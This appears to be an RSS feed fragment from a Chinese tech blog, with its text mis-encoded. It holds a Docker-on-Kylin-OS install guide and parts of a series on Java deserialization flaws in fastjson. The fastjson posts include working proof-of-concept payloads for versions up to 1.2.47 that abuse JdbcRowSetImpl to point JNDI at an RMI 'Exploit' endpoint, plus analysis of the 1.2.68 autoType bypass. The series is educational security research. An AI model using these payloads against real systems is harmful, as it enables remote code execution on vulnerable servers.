&lt;p>å…¬å¸æœ‰ä¸ªé¡¹ç›®éœ€è¦å°†ç³»ç»Ÿéƒ¨ç½²åœ¨ &lt;strong>kylinos&lt;/strong>ä¸Šï¼Œåˆšå¼€å§‹è¿˜æœ‰ç‚¹å¤´ç–¼ï¼Œå®³æ€•å„ç§ç¨‹åºæ— æ³•å®‰è£…å’Œä½¿ç”¨ï¼Œç­‰å®‰è£…å¥½æœåŠ¡å™¨è¿›è¡Œä½¿ç”¨çš„æ—¶å€™å‘ç°è¿™ä¸å°±æ˜¯åŸºäºcentosçš„å˜›ï¼Œè™½ç„¶åŸºäºå“ªä¸ªç‰ˆæœ¬ä¸çŸ¥é“ï¼Œä½†æ˜¯å¯ä»¥æµ‹è¯•çš„ï¼Œäºæ˜¯æˆ‘ä¸€é¡¿æ“ä½œï¼Œæœ€åå‘ç°å®ƒæ˜¯åŸºäºCentos8çš„ï¼Œç³»ç»Ÿå†…æ ¸ç‰ˆæœ¬æ˜¯ 4.19ï¼Œé—®é¢˜ä¸å¤§ï¼Œæ—¢ç„¶æ˜¯åŸºäºCentos8çš„ï¼Œé‚£Centos8ä¸Šèƒ½è·‘çš„ç¨‹åºï¼Œåœ¨è¿™è‚¯å®šä¹Ÿèƒ½è·‘ï¼Œç„¶åæˆ‘å°±å¼€å§‹äº†æ„‰å¿«ï¼ˆç—›è‹¦ï¼‰çš„å®‰è£…dockerä¹‹æ—…äº†ã€‚&lt;/p>
&lt;h3 id="é…ç½®é˜¿é‡Œäº‘centos8é•œåƒæº">é…ç½®é˜¿é‡Œäº‘Centos8é•œåƒæº&lt;/h3>
&lt;p>ä¹‹æ‰€ä»¥è¦é…ç½® Centos8 çš„é•œåƒæºæ˜¯å› ä¸ºåœ¨å®‰è£…dockerçš„æ—¶å€™éœ€è¦é¢å¤–çš„ä¸€äº›ä¾èµ–ï¼Œè€Œè¿™äº›ä¾èµ–åœ¨éº’éºŸå®˜æ–¹çš„æºé‡Œé¢æ˜¯æ²¡æœ‰çš„ã€‚&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-8.repo
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="é…ç½®é˜¿é‡Œäº‘-docker-é•œåƒæº">é…ç½®é˜¿é‡Œäº‘ docker é•œåƒæº&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>yum-config-manager --add-repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sed -i &lt;span style="color:#f1fa8c">&amp;#39;s+download.docker.com+mirrors.aliyun.com/docker-ce+&amp;#39;&lt;/span> /etc/yum.repos.d/docker-ce.repo
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="å®šä¹‰-yum-å˜é‡ä¿®æ”¹-repo">å®šä¹‰ yum å˜é‡&amp;amp;ä¿®æ”¹ repo&lt;/h3>
&lt;p>ä¿®æ”¹ centos å’Œ docker &lt;code>repo&lt;/code>æ–‡ä»¶ä¸­çš„ &lt;code>$releasever&lt;/code> ä¸º &lt;code>centos_version&lt;/code> ï¼ŒåŸå› æ˜¯åœ¨éº’éºŸæœåŠ¡å™¨æ“ä½œç³»ç»ŸV10ä¸­ &lt;code>$releasever&lt;/code>è¢«ä¿®æ”¹ä¸ºäº† 10ï¼Œè€Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ centos 8çš„é•œåƒæºï¼Œå¦‚æœä½ ä¸æ›¿æ¢ï¼ŒåŸºæœ¬ä¸Šä»“åº“çš„æ¯ä¸€ä¸ªåœ°å€éƒ½æ˜¯404ã€‚&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">echo&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;8&amp;#34;&lt;/span> &amp;gt; /etc/yum/vars/centos_version
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sed -i &lt;span style="color:#f1fa8c">&amp;#39;s/$releasever/$centos_version/g&amp;#39;&lt;/span> /etc/yum.repos.d/docker-ce.repo
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sed -i &lt;span style="color:#f1fa8c">&amp;#39;s/$releasever/$centos_version/g&amp;#39;&lt;/span> /etc/yum.repos.d/CentOS-Base.repo
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="å»ºç«‹yumç¼“å­˜">å»ºç«‹yumç¼“å­˜&lt;/h3>
&lt;p>æ²¡å•¥å¯è¯´çš„&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>yum makecache
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="æŸ¥çœ‹docker-ce-ç‰ˆæœ¬">æŸ¥çœ‹docker-ce ç‰ˆæœ¬&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>yum list docker-ce --showduplicates | sort -r
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.9-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.8-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.7-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.6-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.5-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.4-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.3-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.2-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.1-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.12-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.11-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.10-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.0-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:19.03.15-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:19.03.15-3.el8 @docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:19.03.14-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:19.03.13-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="å®‰è£…docker">å®‰è£…docker&lt;/h3>
&lt;p>è¿™é‡Œè¦å®‰è£… docker-ce 19.03 ç‰ˆæœ¬ï¼Œå› ä¸ºæˆ‘åœ¨ä½¿ç”¨æœ€æ–°ç‰ˆ 20.10 å¯åŠ¨å®¹å™¨æ—¶å‡ºç°äº†æœªçŸ¥çš„æƒé™é—®é¢˜ï¼Œè€Œéº’éºŸæœåŠ¡å™¨æ“ä½œç³»ç»Ÿèµ„æ–™ç›¸å¯¹è¾ƒå°‘ï¼Œæˆ‘æœªèƒ½æ‰¾åˆ°ç›¸åº”çš„è§£å†³æ–¹æ¡ˆï¼Œåªå¥½é€€è€Œæ±‚å…¶æ¬¡ï¼Œæ¢åˆ°ä¸Šä¸€ä¸ªç¨³å®šç‰ˆæœ¬ã€‚&lt;/p></description></item><item><title>Java ååºåˆ—åŒ–æ¼æ´åŸç†ï¼ˆå…­ï¼‰fastjson 1.2.68 ç»•è¿‡åŸç†</title><link>https://www.typesafe.cn/posts/java-serialization-vulnerability-6/</link><pubDate>Sat, 06 Nov 2021 17:16:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/java-serialization-vulnerability-6/</guid><description>&lt;h2 id="å£°æ˜">å£°æ˜&lt;/h2>
&lt;p>æœ¬æ–‡ç« ä¸­æ‰€æœ‰å†…å®¹ä»…ä¾›å­¦ä¹ äº¤æµï¼Œä¸¥ç¦ç”¨äºéæ³•ç”¨é€”ï¼Œå¦åˆ™ç”±æ­¤äº§ç”Ÿçš„ä¸€åˆ‡åæœå‡ä¸ä½œè€…æ— å…³ã€‚&lt;/p>
&lt;h2 id="fastjson--1268-expectclass-ç»•è¿‡åŸç†">Fastjson &amp;lt;= 1.2.68 expectClass ç»•è¿‡åŸç†&lt;/h2>
&lt;p>å½“ fastjson æ›´æ–°åˆ° 1.2.68 ä¹‹åï¼Œå¤§éƒ¨åˆ†å®‰å…¨æ¼æ´éƒ½å·²ç»å°å µä½äº†ï¼Œä½†ä¸æ’é™¤è¿˜æœ‰äººæ‰‹é‡Œæ¡ç€ä¸€äº› 0day æ²¡æœ‰æ”¾å‡ºæ¥ã€‚&lt;/p>
&lt;p>fastjson 1.2.68 åœ¨è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™ï¼Œä¼šè¿›å…¥ &lt;code>ObjectDeserializer&lt;/code> çš„ &lt;code>deserialze&lt;/code> æ–¹æ³•ï¼Œè€Œ å®‰å…¨äººå‘˜å‘ç° å½“ &lt;code>@type&lt;/code> ä¸º &lt;code>java.lang.AutoCloseable&lt;/code> çš„æ—¶å€™ä¼šæ‰¾åˆ°å®ç°ç±» &lt;code>JavaBeanDeserializer&lt;/code> è°ƒç”¨ &lt;code>deserialze&lt;/code>ï¼Œè€Œ &lt;code>JavaBeanDeserializer&lt;/code> çš„ &lt;code>deserialze&lt;/code> æ–¹æ³•è¿˜ä¼šç»§ç»­è§£æå¾—åˆ°ç¬¬äºŒä¸ª &lt;code>@type&lt;/code> å¯¹åº”çš„å€¼è¿›è¡Œååºåˆ—åŒ–ï¼Œå¹¶ä¸” &lt;code>expectClass&lt;/code> åˆ™ä¸å†æ˜¯ &lt;code>null&lt;/code> å€¼ï¼Œè€Œæ˜¯ &lt;code>java.lang.AutoCloseable&lt;/code>ã€‚&lt;/p>
&lt;p>&lt;code>JavaBeanDeserializer&lt;/code> çš„ &lt;code>deserialze&lt;/code> éƒ¨åˆ†ä»£ç ç¤ºä¾‹ã€‚&lt;/p>
&lt;pre tabindex="0">&lt;code>if (lexer.token() == JSONToken.LITERAL_STRING) {
 // ç¬¬äºŒä¸ª @type çš„å€¼
 String typeName = lexer.stringVal();
 lexer.nextToken(JSONToken.COMMA);

 if (typeName.equals(beanInfo.typeName)|| parser.isEnabled(Feature.IgnoreAutoType)) {
 if (lexer.token() == JSONToken.RBRACE) {
 lexer.nextToken();
 break;
 }
 continue;
 }
 
 // è¿™é‡Œæ²¡æœ‰è·å–åˆ° deserializer
 ObjectDeserializer deserializer = getSeeAlso(config, this.beanInfo, typeName);
 Class&amp;lt;?&amp;gt; userType = null;

 if (deserializer == null) {
 // ç¬¬ä¸€ä¸ª @type çš„å€¼ 
 Class&amp;lt;?&amp;gt; expectClass = TypeUtils.getClass(type);
 // åœ¨åŒ…å« expectClass æ—¶ä¼šç»•è¿‡
 userType = config.checkAutoType(typeName, expectClass, lexer.getFeatures());
 deserializer = parser.getConfig().getDeserializer(userType);
 }
 
 // å†æ¬¡è¿›è¡Œååºåˆ—åŒ–ï¼Œä¼šè§¦å‘åå°„æ„é€ å®ä¾‹
 Object typedObject = deserializer.deserialze(parser, userType, fieldName);
 if (deserializer instanceof JavaBeanDeserializer) {
 JavaBeanDeserializer javaBeanDeserializer = (JavaBeanDeserializer) deserializer;
 if (typeKey != null) {
 FieldDeserializer typeKeyFieldDeser = javaBeanDeserializer.getFieldDeserializer(typeKey);
 if (typeKeyFieldDeser != null) {
 typeKeyFieldDeser.setValue(typedObject, typeName);
 }
 }
 }
 return (T) typedObject;
}
&lt;/code>&lt;/pre>&lt;p>&lt;code>ParseConfig&lt;/code> çš„ &lt;code>checkAutoType&lt;/code> éƒ¨åˆ†ä»£ç ç¤ºä¾‹ï¼Œåªè¦ç¬¬äºŒä¸ª &lt;code>@type&lt;/code> ç»§æ‰¿äº† ç¬¬ä¸€ä¸ª &lt;code>@type&lt;/code> å³å¯è§¦å‘ã€‚&lt;/p></description></item><item><title>Java ååºåˆ—åŒ–æ¼æ´åŸç†ï¼ˆäº”ï¼‰fastjson 1.2.47 ç»•è¿‡åŸç†</title><link>https://www.typesafe.cn/posts/java-serialization-vulnerability-5/</link><pubDate>Sun, 31 Oct 2021 21:31:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/java-serialization-vulnerability-5/</guid><description>&lt;h2 id="å£°æ˜">å£°æ˜&lt;/h2>
&lt;p>æœ¬æ–‡ç« ä¸­æ‰€æœ‰å†…å®¹ä»…ä¾›å­¦ä¹ äº¤æµï¼Œä¸¥ç¦ç”¨äºéæ³•ç”¨é€”ï¼Œå¦åˆ™ç”±æ­¤äº§ç”Ÿçš„ä¸€åˆ‡åæœå‡ä¸ä½œè€…æ— å…³ã€‚&lt;/p>
&lt;h2 id="fastjson--1247-poc">Fastjson &amp;lt;= 1.2.47 POC&lt;/h2>
&lt;p>éšç€ fastjson çš„æ›´æ–°ï¼Œä»¥å¾€çš„å®‰å…¨æ¼æ´éƒ½è¢«å°å µæ‰äº†ï¼Œä½†é“é«˜ä¸€å°ºï¼Œé­”é«˜ä¸€ä¸ˆï¼Œå®‰å…¨äººå‘˜å‘ç°äº†ä¸€ä¸ªé€šæ€çš„æ¼æ´ï¼Œä»¥å¾€çš„å°å µæ‰‹æ®µéƒ½å¯ä»¥ç»•è¿‡ï¼Œç®—æ˜¯ä¸€ä¸ªé‡Œç¨‹ç¢‘çš„å‘ç°ã€‚&lt;/p>
&lt;p>æˆ‘ä»¬é¦–å…ˆå°† fastjson å‡çº§åˆ° 1.2.47 ç‰ˆæœ¬ï¼Œç„¶åä½¿ç”¨æˆ‘ä»¬ä¹‹å‰çš„POCè¿›è¡Œæµ‹è¯•ã€‚&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> com.alibaba.fastjson.JSON;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">class&lt;/span> &lt;span style="color:#50fa7b">Eval3&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">static&lt;/span> &lt;span style="color:#8be9fd">void&lt;/span> &lt;span style="color:#50fa7b">main&lt;/span>(String&lt;span style="color:#ff79c6">[]&lt;/span> args) &lt;span style="color:#8be9fd;font-style:italic">throws&lt;/span> Exception {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String payload &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;{\&amp;#34;@type\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;,\&amp;#34;dataSourceName\&amp;#34;:\&amp;#34;rmi://localhost:1099/Exploit\&amp;#34;,\&amp;#34;autoCommit\&amp;#34;:true}&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> JSON.&lt;span style="color:#50fa7b">parse&lt;/span>(payload);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¸å‡ºæ„æ–™çš„è¯ä¼šå‡ºç°è¿™æ ·çš„é”™è¯¯æç¤ºä¿¡æ¯ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>autoType is not support. com.sun.rowset.JdbcRowSetImpl
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™æ˜¯å› ä¸º fastjson ä½¿ç”¨äº†é»‘åå•æœºåˆ¶ï¼Œç¦æ­¢å°† &lt;code>com.sun.rowset.JdbcRowSetImpl&lt;/code> ååºåˆ—åŒ–ã€‚&lt;/p>
&lt;p>ä¸‹é¢æˆ‘ä»¬ä½¿ç”¨æ–°çš„ POC è¿›è¡Œæµ‹è¯•ï¼Œåˆå¯ä»¥åˆ©ç”¨æˆåŠŸäº†ã€‚&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> com.alibaba.fastjson.JSON;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">class&lt;/span> &lt;span style="color:#50fa7b">Eval5&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">static&lt;/span> &lt;span style="color:#8be9fd">void&lt;/span> &lt;span style="color:#50fa7b">main&lt;/span>(String&lt;span style="color:#ff79c6">[]&lt;/span> args) &lt;span style="color:#8be9fd;font-style:italic">throws&lt;/span> Exception {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String payload &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;{\&amp;#34;a\&amp;#34;:{\&amp;#34;@type\&amp;#34;:\&amp;#34;java.lang.Class\&amp;#34;,\&amp;#34;val\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;},\&amp;#34;b\&amp;#34;:{\&amp;#34;@type\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;,\&amp;#34;dataSourceName\&amp;#34;:\&amp;#34;rmi://localhost:1099/Exploit\&amp;#34;,\&amp;#34;autoCommit\&amp;#34;:true}}&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> JSON.&lt;span style="color:#50fa7b">parse&lt;/span>(payload);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>payload æ ¼å¼åŒ–ä¹‹åå¦‚ä¸‹ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#f1fa8c">&amp;#34;a&amp;#34;&lt;/span>: {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#f1fa8c">&amp;#34;@type&amp;#34;&lt;/span>: &lt;span style="color:#f1fa8c">&amp;#34;java.lang.Class&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#f1fa8c">&amp;#34;val&amp;#34;&lt;/span>: &lt;span style="color:#f1fa8c">&amp;#34;com.sun.rowset.JdbcRowSetImpl&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	},
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#f1fa8c">&amp;#34;b&amp;#34;&lt;/span>: {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#f1fa8c">&amp;#34;@type&amp;#34;&lt;/span>: &lt;span style="color:#f1fa8c">&amp;#34;com.sun.rowset.JdbcRowSetImpl&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#f1fa8c">&amp;#34;dataSourceName&amp;#34;&lt;/span>: &lt;span style="color:#f1fa8c">&amp;#34;rmi://localhost:1099/Exploit&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#f1fa8c">&amp;#34;autoCommit&amp;#34;&lt;/span>: &lt;span style="color:#ff79c6">true&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="fastjson--1247-ç»•è¿‡åŸç†">Fastjson &amp;lt;= 1.2.47 ç»•è¿‡åŸç†&lt;/h2>
&lt;p>åœ¨å­¦ä¹ ç»•è¿‡åŸç†ä¹‹å‰ï¼Œäº†è§£ fastjson çš„åŸºæœ¬è§£ææµç¨‹è¿˜æ˜¯æœ‰å¿…è¦çš„ï¼Œæˆ‘ç”»äº†ä¸€å¼ ç±»å›¾ä»…ä¾›å‚è€ƒï¼Œå›¾ä¸­åªç”»äº†ä¸»è¦æµç¨‹ï¼Œè¿˜æœ‰å¾ˆå¤šç±»æ²¡æœ‰ç”»ã€‚&lt;/p></description></item><item><title>Java ååºåˆ—åŒ–æ¼æ´åŸç†ï¼ˆå››ï¼‰JNDI + RMI/LDAP åœ¨fastjsonä¸­çš„åˆ©ç”¨åŸç†</title><link>https://www.typesafe.cn/posts/java-serialization-vulnerability-4/</link><pubDate>Sat, 30 Oct 2021 13:43:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/java-serialization-vulnerability-4/</guid><description>&lt;h2 id="å£°æ˜">å£°æ˜&lt;/h2>
&lt;p>æœ¬æ–‡ç« ä¸­æ‰€æœ‰å†…å®¹ä»…ä¾›å­¦ä¹ äº¤æµï¼Œä¸¥ç¦ç”¨äºéæ³•ç”¨é€”ï¼Œå¦åˆ™ç”±æ­¤äº§ç”Ÿçš„ä¸€åˆ‡åæœå‡ä¸ä½œè€…æ— å…³ã€‚&lt;/p>
&lt;h2 id="jndi-æ˜¯ä»€ä¹ˆ">JNDI æ˜¯ä»€ä¹ˆ&lt;/h2>
&lt;p>Javaå‘½åå’Œç›®å½•æ¥å£ï¼ˆJava Naming and Directory Interfaceï¼Œç¼©å†™JNDIï¼‰ï¼Œæ˜¯Javaçš„ä¸€ä¸ªç›®å½•æœåŠ¡åº”ç”¨ç¨‹åºæ¥å£ï¼ˆAPIï¼‰ï¼Œå®ƒæä¾›ä¸€ä¸ªç›®å½•ç³»ç»Ÿï¼Œå¹¶å°†æœåŠ¡åç§°ä¸å¯¹è±¡å…³è”èµ·æ¥ï¼Œä»è€Œä½¿å¾—å¼€å‘äººå‘˜åœ¨å¼€å‘è¿‡ç¨‹ä¸­å¯ä»¥ä½¿ç”¨åç§°æ¥è®¿é—®å¯¹è±¡ã€‚&lt;/p>
&lt;p>JNDI åŒ…å«åœ¨Java SEä¸­ï¼Œä¸éœ€è¦å¼•ç”¨ç¬¬ä¸‰æ–¹jarå³å¯ä½¿ç”¨ã€‚è¦ä½¿ç”¨ JNDI å¿…é¡»è¦æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªæœåŠ¡æä¾›è€…ã€‚JDK æœ¬èº«å·²ç»åŒ…æ‹¬äº†ä¸‹é¢å‡ ç§æœåŠ¡æä¾›è€…ã€‚&lt;/p>
&lt;ul>
&lt;li>è½»é‡çº§ç›®å½•è®¿é—®åè®® (LDAP)&lt;/li>
&lt;li>CORBA å…¬å…±å¯¹è±¡æœåŠ¡å‘½åï¼ˆCOS namingï¼‰&lt;/li>
&lt;li>Java è¿œç¨‹æ–¹æ³•è°ƒç”¨ (RMI)&lt;/li>
&lt;li>åŸŸåæœåŠ¡ (DNS)&lt;/li>
&lt;/ul>
&lt;p>è¿™ä¹ˆè¯´èµ·æ¥è¿˜æ˜¯æœ‰ç‚¹æŠ½è±¡ï¼Œç®€å•ç†è§£å°±æ˜¯&lt;strong>æœåŠ¡æä¾›è€…&lt;/strong>æä¾›ä¸€ä¸ªç±»ä¼¼Key Valueçš„æ•°æ®ï¼Œ&lt;strong>JNDI&lt;/strong>å¯ä»¥é€šè¿‡è¿™ä¸ª Key è·å–åˆ°&lt;strong>æœåŠ¡æä¾›è€…&lt;/strong>ä¸Šçš„æä¾›çš„Valueï¼Œå› æ­¤JNDIæ˜¯æ— æ³•å•ç‹¬ä½¿ç”¨çš„ã€‚&lt;/p>
&lt;p>ä½¿ç”¨JNDIçš„æ–¹å¼ä¹Ÿå¾ˆç®€å•ï¼Œä¸‹é¢å°±æ˜¯ä¸€ä¸ªè·å–è¿œç¨‹å¯¹è±¡çš„ç¤ºä¾‹ä»£ç ã€‚&lt;/p>
&lt;pre tabindex="0">&lt;code>// åˆ›å»ºä¸€ä¸ªä¸Šä¸‹æ–‡å¯¹è±¡
InitialContext context = new InitialContext();
// æŸ¥æ‰¾ç›‘å¬åœ¨æœ¬åœ° 1099 ç«¯å£ä¸Š RMI æœåŠ¡çš„ Object å¯¹è±¡
Object obj = context.lookup(&amp;#34;rmi://localhost:1099/Object&amp;#34;);
&lt;/code>&lt;/pre>&lt;h2 id="rmi-æ˜¯ä»€ä¹ˆ">RMI æ˜¯ä»€ä¹ˆ&lt;/h2>
&lt;p>RMI æ˜¯ Remote Method Invocation çš„ç¼©å†™ï¼Œä¸­æ–‡å«ä¹‰ä¸ºè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼Œå³ä¸€ä¸ªJavaç¨‹åºè°ƒç”¨è°ƒç”¨å¦ä¸€ä¸ªJavaç¨‹åºæš´éœ²å‡ºæ¥çš„æ–¹æ³•ã€‚&lt;/p>
&lt;p>RMI æœ‰ä¸‰ä¸ªæ¦‚å¿µï¼š&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Registry :&lt;/strong> æä¾›æœåŠ¡æ³¨å†Œå’ŒæœåŠ¡è·å–ï¼ŒæœåŠ¡ç«¯å°†ç±»åç§°ï¼Œå­˜æ”¾åœ°å€æ³¨å†Œåˆ°Registryä¸­ï¼Œä»¥ä¾›å®¢æˆ·ç«¯è·å–ã€‚&lt;/li>
&lt;li>&lt;strong>Server :&lt;/strong> è¿œç¨‹æ–¹æ³•çš„æä¾›è€…ã€‚&lt;/li>
&lt;li>&lt;strong>Client :&lt;/strong> è¿œç¨‹æ–¹æ³•çš„è°ƒç”¨è€…ã€‚&lt;/li>
&lt;/ul>
&lt;p>è¿œç¨‹æ–¹æ³•çš„å®šä¹‰éœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š&lt;/p>
&lt;ol>
&lt;li>å®ç° &lt;code>java.rmi.Remote&lt;/code>ã€‚&lt;/li>
&lt;li>ç»§æ‰¿ &lt;code>java.rmi.server.UnicastRemoteObject&lt;/code>ã€‚&lt;/li>
&lt;/ol>
&lt;h2 id="rmi-ä½¿ç”¨ç¤ºä¾‹">RMI ä½¿ç”¨ç¤ºä¾‹&lt;/h2>
&lt;h3 id="registry">Registry&lt;/h3>
